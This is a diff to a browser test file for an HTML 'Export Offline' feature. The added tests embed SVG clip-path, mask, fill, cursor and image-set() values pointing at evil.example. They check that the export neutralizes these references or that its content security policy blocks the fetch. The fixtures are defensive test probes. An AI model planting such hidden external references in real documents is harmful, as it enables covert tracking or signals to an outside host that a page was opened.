@@ -526,6 +526,12 @@ test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and 
 <audio src="https://evil.example/audio.mp3"><source src="https://evil.example/audio-source.ogg"></audio>
 <input type="image" alt="submit" src="https://evil.example/input.png">
 <div background="https://evil.example/background.png">legacy background</div>
+<svg width="20" height="20" aria-label="presentation refs">
+  <defs><clipPath id="localClip"><rect width="5" height="5"/></clipPath></defs>
+  <rect id="presentationProbe" width="20" height="20" clip-path="url(https://evil.example/clip.svg#c)" mask="url(https:evil.example/mask.svg#m)" fill="url(//evil.example/paint.svg#g)" stroke="url(https://evil.example/stroke.svg#s)" filter="url(https://evil.example/filter.svg#f)" marker-end="url(https://evil.example/marker.svg#m)" cursor="url(https://evil.example/pointer.cur), auto"/>
+  <rect id="presentationKeep" width="20" height="20" clip-path="url(#localClip)" fill="#336699"/>
+</svg>
+<noscript><svg width="20" height="20" aria-label="fallback presentation ref"><rect id="noscriptPresentationProbe" width="20" height="20" mask="url(https://evil.example/noscript-mask.svg#m)"/></svg></noscript>
 <script>const u = "https://evil.example/dynamic-import.js"; import(u);</script>`;
   const staged = stageContent(CONTENT_WITH_EGRESS, { key: "cmh-offline-zero-network", source: "offline-zero.html" });
   const server = await startStaticServer(staged.dir);
@@ -587,6 +593,36 @@ test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and 
     // scheme-only `url(https:host/x.png)` resolves to the same host.
     expect(noscriptInlineStyleTag[0]).not.toMatch(/url\(\s*(?:&quot;|&#39;|["'])?\s*(?:https?:\/*|\/\/)/i);
     expect(exportedHtml).not.toContain("evil.example");
+    // An SVG PRESENTATION ATTRIBUTE carries a CSS declaration VALUE, so it is neutralized by the
+    // same `_offlineCssNoNetwork` reading the `style=` strip uses (#1186) - the network reference
+    // becomes `url("data:,")` rather than the attribute being deleted, and a LOCAL `url(#id)`
+    // reference (which is how these attributes are almost always written) survives byte-identical.
+    // The strict validator run below is the other half of the CMH-OFFLINE-04 pairing: the gate now
+    // reports exactly this shape, so a strip that missed it would emit a file its own gate rejects.
+    const presentationTag = exportedHtml.match(/<rect\b[^>]*id="presentationProbe"[^>]*>/i);
+    expect(presentationTag && presentationTag[0]).toBeTruthy();
+    expect(presentationTag[0]).not.toMatch(/url\(\s*(?:&quot;|&#39;|["'])?\s*(?:https?:\/*|\/\/)/i);
+    // Every attribute the strip claims to neutralize is asserted on a REAL exported file, not only
+    // through the source-reading parity test: the network reference is replaced by the neutral
+    // `url("data:,")` (serialized with the quotes escaped), so a value that had been DELETED
+    // instead - or one the strip never reached - fails here rather than passing the weaker "no
+    // evil.example anywhere" check above (round-2 panel).
+    for (const attr of ["clip-path", "mask", "fill", "stroke", "filter", "marker-end", "cursor"]) {
+      expect(presentationTag[0], attr).toMatch(new RegExp(`\\b${attr}="url\\(&quot;data:,&quot;\\)`, "i"));
+    }
+    // The `<noscript>` fallback view, where the two sides could most easily disagree: the strict
+    // gate reads that markup off its egress index (a scripting-DISABLED reader really loads it),
+    // and the export's `DOMParser` runs with scripting OFF too, so its selector reaches the same
+    // element. A strip that missed it would emit a file its own `--strict` rejects.
+    const noscriptPresentationTag =
+      exportedHtml.match(/<rect\b[^>]*id="noscriptPresentationProbe"[^>]*>/i);
+    expect(noscriptPresentationTag && noscriptPresentationTag[0]).toBeTruthy();
+    expect(noscriptPresentationTag[0])
+      .not.toMatch(/url\(\s*(?:&quot;|&#39;|["'])?\s*(?:https?:\/*|\/\/)/i);
+    const presentationKeepTag = exportedHtml.match(/<rect\b[^>]*id="presentationKeep"[^>]*>/i);
+    expect(presentationKeepTag && presentationKeepTag[0]).toBeTruthy();
+    expect(presentationKeepTag[0]).toMatch(/clip-path="url\(#localClip\)"/);
+    expect(presentationKeepTag[0]).toMatch(/fill="#336699"/);
     // `<image src>` / `<image srcset>` (#1165). In HTML content tree construction RENAMES the tag to
     // `img`, so the `all("img")` pass reaches that one; inside `<svg>` the element keeps its own name
     // and only `all("image")` does. Both have to be cleared, because the shared egress index the
@@ -4397,6 +4433,85 @@ test("CMH-OFFLINE-04: a reference in a scheme no Chromium fetches survives the s
     await page2.goto(fileUrl(exportedPath));
     await ready(page2);
     await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
+    expect(external).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    await server.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+// CMH-VAL-08 / CMH-OFFLINE-04 (issue #1186, round-1 panel): the offline scope of the `image-set()`
+// reading is an ENFORCEMENT CLAIM - "offline it is the zero-network CSP, not the parser-level
+// strip, that stops this fetch" - and a claim of that shape is exactly what CMH-SEC-06 says must be
+// PROVEN rather than asserted (two earlier "the CSP covers it" claims turned out to be false). So
+// this exports a document carrying a bare `image-set()` candidate - which carries no `url()`
+// wrapper, so neither the gate's `CSS_NETWORK_URL_RE` nor the export's `_offlineCssNoNetwork` sees
+// it - in both spellings the reading is scoped to, then runs the live oracle: the strip leaves the
+// candidate (the declared residual), the gate certifies the file the export just produced, and
+// OPENING that file reaches the network zero times because the policy blocks it.
+test("CMH-OFFLINE-04: the offline CSP, not the strip, is what blocks a bare image-set candidate", async ({ page, browser }) => {
+  test.setTimeout(120000);
+  const CONTENT_WITH_IMAGE_SET = `
+<h1>Image-set residual</h1>
+<p id="image-set-note">A bare image-set candidate carries no url() wrapper, so no pattern sees it.</p>
+<svg width="20" height="20" aria-label="image-set refs">
+  <rect id="imageSetAttrProbe" width="20" height="20" mask="image-set(&quot;https://evil.example/iset-attr.png&quot; 1x)"/>
+  <rect id="imageSetCursorProbe" width="20" height="20" cursor="image-set(&quot;https://evil.example/iset-cursor.cur&quot; 1x), auto"/>
+  <rect id="imageSetStyleProbe" width="20" height="20" style="mask-image:image-set('https://evil.example/iset-style.png' 1x)"/>
+</svg>`;
+  const staged = stageContent(CONTENT_WITH_IMAGE_SET, { key: "cmh-offline-image-set", source: "offline-image-set.html" });
+  const server = await startStaticServer(staged.dir);
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    await page.route(/^https?:\/\//, async (route) => {
+      const url = route.request().url();
+      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
+      return route.abort();
+    });
+    await installDownloadTextCapture(page);
+    await page.goto(server.url + "/test-doc.html");
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    // The declared residual, pinned as a FACT rather than left implicit: the strip rewrites `url()`
+    // and nothing else, so both candidates survive byte-for-byte.
+    expect(exportedHtml).toContain("iset-attr.png");
+    expect(exportedHtml).toContain("iset-cursor.cur");
+    expect(exportedHtml).toContain("iset-style.png");
+
+    const exportedPath = path.join(outDir, "offline-image-set.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    // ...and the gate agrees with its own export rather than rejecting it, which is why the
+    // offline half of the reading is scoped out in the first place.
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+
+    // The claim itself: with the export's CSP in place, opening the file fetches nothing. If this
+    // ever goes red, the offline scope decision is void and BOTH the gate reading and the strip
+    // have to be widened together.
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
+    // A cursor image is only fetched once the cursor APPLIES, so the pointer is moved into the
+    // cursor probe's own box - without that the empty request list would prove the mask and
+    // `style=` candidates only, and say nothing about the cursor case this scope also covers.
+    const cursorBox = await page2.locator("#imageSetCursorProbe").boundingBox();
+    expect(cursorBox).toBeTruthy();
+    await page2.mouse.move(cursorBox.x + cursorBox.width / 2, cursorBox.y + cursorBox.height / 2);
+    await page2.waitForTimeout(1500);
     expect(external).toEqual([]);
   } finally {
     if (ctx2) await ctx2.close();
